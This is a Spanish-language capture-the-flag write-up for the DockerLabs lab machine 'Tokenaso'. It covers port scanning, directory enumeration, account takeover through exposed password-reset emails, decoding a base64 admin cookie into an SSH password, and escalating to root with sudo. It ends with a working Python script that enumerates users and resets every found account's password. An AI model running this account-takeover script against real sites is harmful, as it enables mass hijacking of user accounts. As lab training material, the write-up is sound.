![Screenshot](/hard/Tokenaso/Images/machine.png)

Dificultad: **hard**

Hecho por: **d1se0**

# Pasos para pwnear 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🔍 [Enumeración](#enumeración)
* 🪓 [Explotación](#exploitación)
* 🚩 [Escalada de privilegios](#escalada-de-privilegios)
* 💣 [EXTRA (EXPLOIT)](#extra)

---

Primero nos aseguramos de que la máquina esté activa, podemos hacer esto con el comando **ping**.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.190 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.131 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.134 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2049ms
rtt min/avg/max/mdev = 0.131/0.151/0.190/0.027 ms
```

Bien, ahora podemos comenzar nuestra fase de **reconocimiento**.

---
# Reconocimiento

Así que usamos primero **nmap** para escanear qué puertos están abiertos en el objetivo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-20 18:54 -05
Initiating ARP Ping Scan at 18:54
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 18:54, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:54
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 18:54, 3.00s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000028s latency).
Scanned at 2025-12-20 18:54:02 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.38 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, comenzando desde el puerto 1 hasta el puerto 65,535.

**-n** <- Con este argumento nmap omitirá la resolución DNS, esto es porque a veces en nuestros escaneos esto puede ser muy lento en algunos casos.

**-sS** <- Con este argumento nmap hará un escaneo sigiloso, esto significa que el 3-way-handshake no se completará, y también hace el escaneo un poco más rápido.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, haciendo el escaneo aún más rápido.

**-Pn** <- Con este argumento nmap también omitirá la fase de descubrimiento de host, esto significa que nmap tratará la máquina como activa y hará el escaneo inmediatamente.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras el escaneo continúa, esto significa que si nmap descubre un puerto abierto inmediatamente nos lo reportará mientras el escaneo continúa.

**--open** <- Con este argumento le estamos diciendo a nmap que solo filtre los puertos abiertos.

Así que cuando el escaneo concluye podemos ver que hay 2 puertos abiertos:

- puerto 22 (ssh / secure shell)
- puerto 80 (http / Hyper-Text Transfer Protocol)

Pero, necesitamos saber más sobre estos puertos, así que podemos usar una vez más **nmap**.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ nmap -p22,80 -sCV 172.17.0.2 -oX target
```

**-p22,80** <- Con este argumento nmap solo escaneará estos 2 puertos que descubrimos.

**-sCV** <- Con este argumento nmap escaneará por cada puerto su versión para encontrar algunas posibles vulnerabilidades sobre sistemas no actualizados, y también hará un escaneo con algunos scripts que ejecuta nmap, para encontrar más sobre estos puertos.

**-oX target** <- Con este argumento guardamos toda la salida que nmap nos da y la guardamos como un archivo xml.

Después de que el escaneo termine obtenemos la salida en un archivo xml, hacemos esto para crear una página html para ver la información más fácilmente y más agradable a la vista.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo xml a un archivo html, ahora vamos a abrirlo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ open target.html 
```

Y podemos ver esto en nuestro navegador.

![Screenshot](/hard/Tokenaso/Images/image1.png)

Es claramente más bonito y legible a la vista.

Y podemos ver que el puerto 80 es un sitio web, echemos un vistazo a qué tecnologías usa, podemos hacer esto con **whatweb**.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ whatweb http://172.17.0.2 
http://172.17.0.2 [200 OK] Apache[2.4.58], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[SecureAuth Pro - Portal de Acceso]
```

Parece que usa **PHP** debido a la cookie, pero echemos un vistazo más profundo con nuestro navegador.

![Screenshot](/hard/Tokenaso/Images/image2.png)

Parece una página de inicio de sesión, obtuvimos las credenciales del usuario **diseo** a primera vista pero voy a enumerar más profundamente los recursos del sitio web con **gobuster**.

---
# Enumeración

Podemos intentar enumerar el sitio web con **gobuster** y también intentar encontrar posibles archivos, en este caso voy a agregar la extensión de **php**.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2696]
/login.php            (Status: 200) [Size: 3020]
/admin.php            (Status: 302) [Size: 0] [--> login.php]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
/emails               (Status: 301) [Size: 309] [--> http://172.17.0.2/emails/]
/emails.php           (Status: 302) [Size: 0] [--> login.php]
/forgot-password.php  (Status: 200) [Size: 1035]
/server-status        (Status: 403) [Size: 275]
Progress: 441116 / 441116 (100.00%)
```

Vemos muchos resultados aquí, los interesantes son:

- **admin.php**
- **emails**/ tiene algo aquí.
- **dashboard.php**
- **config.php**

Así que empecé con el archivo config, pero después de una larga enumeración no tiene nada interesante allí.

**dashboard** y **admin** nos redirigen a la página de inicio de sesión.

Así que echemos un vistazo a **emails** con nuestro navegador...

![Screenshot](/hard/Tokenaso/Images/image3.png)

Interesante, listado de directorios aquí...

Así que voy a hacer clic en que olvidé la contraseña del usuario **diseo**, y veamos qué pasa.

![Screenshot](/hard/Tokenaso/Images/image4.png)

Pero primero lo intento con un usuario aleatorio como **test**, a veces hacer la acción incorrecta puede mostrarnos algo interesante.

![Screenshot](/hard/Tokenaso/Images/image5.png)

Esta es una vulnerabilidad, básicamente nos muestra que el usuario no existe, podemos intentar hacer un script de python para enumerar usuarios dentro del sistema con este mensaje de error, pero, intentemos primero ingresar un usuario existente como **diseo**.

![Screenshot](/hard/Tokenaso/Images/image6.png)

Bien, parece que envía un correo a **diseo**, pero si recordamos antes que obtuvimos un directorio interesante, **emails**.

Así que echemos un vistazo una vez más al directorio **emails** si algo cambió.

![Screenshot](/hard/Tokenaso/Images/image7.png)

¡Oh! parece que podemos ver los correos del usuario **diseo**, echemos un vistazo.

![Screenshot](/hard/Tokenaso/Images/image8.png)

Y obtuvimos esto, parece el mismo correo de que olvidamos nuestra contraseña.

E incluso el enlace para restablecer la contraseña de **diseo**, ¡esto es malo!

![Screenshot](/hard/Tokenaso/Images/image9.png)

Y santo cielo, podemos cambiar la contraseña del usuario, así que voy a cambiarla a mi preferencia.

![Screenshot](/hard/Tokenaso/Images/image10.png)

Parece que la cambiamos, así que voy a iniciar sesión con esta nueva contraseña.

![Screenshot](/hard/Tokenaso/Images/image11.png)

¡Y estamos dentro! así que podemos intentar incluso enumerar usuarios y robar esta url de restablecimiento y cambiar su contraseña, pero no es necesario porque si recordamos, existe un usuario **victim** y es parte del departamento de administración.

Así que podemos intentar iniciar sesión como este usuario y pretender que olvidamos la contraseña y robar la url de restablecimiento para cambiar su contraseña.

---
# Explotación

Y haciendo todos los pasos que replicamos antes pero solo cambiando el usuario a **victim** obtenemos exitosamente el acceso de este usuario.

![Screenshot](/hard/Tokenaso/Images/image12.png)

Y veamos si obtuvimos acceso de la cuenta **victim**.

![Screenshot](/hard/Tokenaso/Images/image13.png)

¡Y estamos dentro como un admin!

Así que obtenemos acceso al panel de administración, así que echemos un vistazo allí.

![Screenshot](/hard/Tokenaso/Images/image14.png)

¡Y podemos ver muchas cosas interesantes!

Pero... nada funciona, parece pura decoración, literalmente eché un vistazo más profundo en su código fuente y más y más veces.

Después de enumerar muuuucho literalmente todo, me dio la idea de interceptar el tráfico de las peticiones con **burpsuite**.

Y podemos recibir esto:

```ruby
Host: 172.17.0.2
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Referer: http://172.17.0.2/dashboard.php
Accept-Encoding: gzip, deflate, br
Cookie: iconSize=16x16; PHPSESSID=hbk76vuhr36b2e4ltbd0is05ku; admin_token=UEBzc3cwcmQhVXNlcjRkbTFuMjAyNSEjLQ%3D%3D
Connection: keep-alive
```

Y vemos algo interesante aquí, podemos ver que el token de admin es muy raro, el formato está en formato **base64** y **url encoded**.

Así que primero decodifiquemos el formato url.

los caracteres o valores ```$3D``` es igual a ```=```

Así que haciendo esto obtenemos esto:

- ``UEBzc3cwcmQhVXNlcjRkbTFuMjAyNSEjLQ==```

Y decodificando esto en base64 obtenemos esto:

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ echo "UEBzc3cwcmQhVXNlcjRkbTFuMjAyNSEjLQ==" | base64 -d
P@ssw0rd!User4dm1n2025!#-
```

Obtuvimos una credencial, parece una contraseña de un usuario **admin**, podemos intentar iniciar sesión con ssh, y veamos qué pasa...

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ ssh admin@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:x5hgBIKbC2bhYOGMYq7UH8HjH5cNtezj8Im+80TMT4Y
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
admin@172.17.0.2's password: 
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.17.10+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Dec  6 10:55:04 2025 from 172.17.0.1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@c924f10ab199:~$
```

¡Y estamos dentro!

---
# Escalada de Privilegios

Si ejecutamos **sudo -l** tenemos un privilegio de **SUDOER**

```
admin@c924f10ab199:~$ sudo -l
[sudo] password for admin: 
Matching Defaults entries for admin on c924f10ab199:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User admin may run the following commands on c924f10ab199:
    (ALL) ALL
```

Podemos ver que **cualquier** usuario incluso el usuario **root** puede ejecutar **cualquier** comando, así que podemos recibir una shell como el usuario root solo haciendo **sudo bash**

```
admin@c924f10ab199:~$ sudo bash
root@c924f10ab199:/home/admin# whoami
root
```

Ahora somos root ***...pwned..!***

---
# Extra

Hice un exploit que abusa de estas vulnerabilidades con **python**.

1. Primero notamos que podemos **enumerar** usuarios en la página de **forgot-password**.
2. También el sitio web no refresca o cambia el token **csrf** cuando intentamos cambiar la contraseña.
3. Obtuvimos cualquier correo de cualquier usuario en la parte del directorio **/emails/** y no cambia nada.
4. Tenemos acceso a la url de restablecimiento, sin ninguna autenticación.
5. Y cuando cambiamos la contraseña no requiere ninguna validación.

Así que con todo esto hice un script de python que explota esto, enumerando usuarios y cuando el usuario existe obtiene el json de los correos y extrae la url de restablecimiento y automáticamente cambiamos la contraseña que queremos.

Así que aquí está el exploit:

```python
from pwn import *
import requests
import signal
import sys
import json

target = "http://172.17.0.2/forgot-password.php"
dictionary = "test_users"

def stop(sig, frame):
        log.warn("QUITTING")
        sys.exit(0)

signal.signal(signal.SIGINT, stop)

def check_user(user, cookie, token, password):
        payload = {
                "csrf": token,
                "username": user
        }

        ck = {"PHPSESSID": cookie}

        response = requests.post(url=target, cookies=ck, data=payload)

        if "Usuario no encontrado" in response.text: return

        print("------------------------------------------------")
        log.info(f'User "{user}" exists, trying to change his password...')
        emails = f"http://172.17.0.2/emails/{user}_emails.json"

        get_emails = requests.get(url=emails)

        format = json.loads(get_emails.text)
        reset = format[0]["reset_url"]

        new_pass = {
                "new_password": password,
                "confirm_password": password
        }

        change = requests.post(url=reset, cookies=ck, data=new_pass)

        if "correctamente" in change.text:
                log.warn(f'PWNED! his new password is: {password}')


def execute():
        cookie = input("[*] Enter your cookie --> ").strip()
        token = input("[*] Enter your csrf token --> ").strip()
        password = input("\n[!] Enter the password you want to change --> ").strip()
        print()

        bar = log.progress("Enumerating users...")

        with open(dictionary) as file:
                for line in file:

                        if "#" in line or not line: continue
                        convert = str(line).strip()

                        bar.status(f"Trying with the user {convert}")
                        check_user(convert, cookie, token, password)

                bar.success("Finished.")

if __name__ == "__main__":
        execute()
```

Así que veamos si funciona.

**Nota**: Cambié un poco la base de datos para agregar más usuarios y probar si realmente funciona. (**OPCIONAL**)

Si quieres agregar más usuarios en la base de datos solo necesitas cambiar el siguiente archivo:

- /var/www/html/reset-db.php

y cualquier usuario que quieras, en mi caso agregué estos:

```php
$users = [
    ['username' => 'diseo', 'password' => password_hash('hacker', PASSWORD_DEFAULT), 'email' => 'diseo@ctf.com', 'name' => 'Diseo User', 'role' => 'user'],
    ['username' => 'victim', 'password' => password_hash('SuperPassword#-', PASSWORD_DEFAULT), 'email' => 'victim@ctf.com', 'name' => 'Victim User', 'role' => 'admin'],
    ['username' => 'craft', 'password' => password_hash('AU()943Mnd$!', PASSWORD_DEFAULT), 'email' => 'craft@ctf.com', 'name' => 'Craft User', 'role' => 'admin'],
    ['username' => 'administrator', 'password' => password_hash('NN048IWs4#$', PASSWORD_DEFAULT), 'email' => 'administrator@ctf.com', 'name' => 'Administrator User', 'role' => 'admin'],
    ['username' => 'mario', 'password' => password_hash('Pinguinazo!##8s', PASSWORD_DEFAULT), 'email' => 'mario@ctf.com', 'name' => 'Mario User', 'role' => 'admin']
    ];
```

Y para aplicar los cambios puedes guardarlo y luego visitar el sitio web:

- ```http://172.17.0.2/reset-db.php```

podemos hacer esto con curl.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/exploits]
└─$ curl -s http://172.17.0.2/reset-db.php | html2text
â Base de datos reseteada correctamente Usuarios creados: - diseo
(contraseÃ±a: hacker) - Rol: Usuario - victim (contraseÃ±a: SuperPassword#-) -
Rol: Administrado
```

Y cuando hacemos esto, podemos usar nuestro exploit.

## Requisitos:

- Necesitas instalar pwntools, puedes hacerlo con pip3, pipx, apt, etc...

Y luego el script necesita tu cookie, puedes obtenerla con las herramientas de desarrollador, o interceptando la petición.

También el script necesita el token **CSRF**, puedes obtenerlo con **burpsuite** interceptando la petición cuando envías el "correo" desde la parte de olvidar la contraseña.

Así que probemos si realmente funciona. En este repositorio contiene una lista de usuarios para probar, aprox 300 usuarios (contiene el usuario **diseo** y **victim**).

Ejecutemos nuestro exploit entonces.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/exploits]
└─$ python3 exploit.py 
[*] Enter your cookie --> hbk76vuhr36b2e4ltbd0is05ku
[*] Enter your csrf token --> 680c0e9e47cbe3a8dcd757ae1bfaa5844798854b2cd5ad5330845a26e7dca021

[!] Enter the password you want to change --> pwned123

[+] Enumerating users...: Finished.
------------------------------------------------
[*] User "craft" exists, trying to change his password...
[!] PWNED! his new password is: pwned123
------------------------------------------------
[*] User "victim" exists, trying to change his password...
[!] PWNED! his new password is: pwned123
------------------------------------------------
[*] User "mario" exists, trying to change his password...
[!] PWNED! his new password is: pwned123
------------------------------------------------
[*] User "administrator" exists, trying to change his password...
[!] PWNED! his new password is: pwned123
------------------------------------------------
[*] User "diseo" exists, trying to change his password...
[!] PWNED! his new password is: pwned123
```

Parece que funciona, :)))

adios tonotos :3
